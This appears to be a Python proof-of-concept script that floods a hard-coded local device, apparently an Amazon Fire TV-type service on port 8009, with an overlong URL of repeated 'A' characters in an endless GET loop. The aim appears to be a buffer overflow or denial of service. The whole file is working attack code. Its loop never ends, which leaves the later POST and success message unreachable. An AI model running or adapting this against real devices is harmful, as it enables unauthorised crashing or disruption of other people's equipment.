import sys
import socket
import requests
import json


# for carg in sys.argv:
    # if carg == "-s":
        # argnum = sys.argv.index(carg)
        # argnum += 1
        # host = sys.argv[argnum]
    # elif carg == "-p":
        # argnum = sys.argv.index(carg)
        # argnum += 1
        # port = sys.argv[argnum]

		
		
host = "192.168.1.226"
port = 8009

baseUrl = 'http://' + host + ':' + str(port)
basePath = '/apps/'
#payload = '\x41' * 8038
payload = '\x41' * 8039
buffer = baseUrl + basePath + payload
# s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.connect((host,port))
# s.send(buffer)
# s.close()


count=0
while count==0:
    get_response = requests.get(url=buffer)
    post_data = {'app':'com.amazon.venezia'}

# POST some form-encoded data:
post_response = requests.post(url=baseUrl+'/post/', data=post_data)

#post_response = requests.post(url='http://httpbin.org/post', data=json.dumps(post_data))
# If using requests v2.4.2 or later, pass the dict via the json parameter and it will be encoded directly:
#post_response = requests.post(url='http://httpbin.org/post', json=post_data)

print("Sent Buffer To Device!")

